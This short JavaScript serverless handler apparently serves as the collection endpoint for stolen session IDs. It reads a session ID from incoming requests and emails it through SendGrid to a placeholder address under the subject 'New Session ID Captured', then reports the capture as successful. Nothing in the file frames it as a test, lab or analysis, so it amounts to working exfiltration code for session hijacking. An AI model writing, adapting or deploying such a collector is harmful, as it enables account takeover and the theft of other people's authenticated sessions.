exports.handler = async function(event, context) {
  const sessionID = event.body.sessionID;
  // Send the session ID to your email or another endpoint
  const email = 'your-email@example.com';
  const subject = 'New Session ID Captured';
  const body = `Session ID: ${sessionID}`;

  // You can use a service like SendGrid or Mailgun to send the email
  // For example, using SendGrid:
  const sgMail = require('@sendgrid/mail');
  sgMail.setApiKey(process.env.SENDGRID_API_KEY);
  const msg = {
    to: email,
    from: 'your-email@example.com',
    subject: subject,
    text: body,
  };
  await sgMail.send(msg);

  return {
    statusCode: 200,
    body: JSON.stringify({ message: 'Session ID captured and sent successfully.' }),
  };
};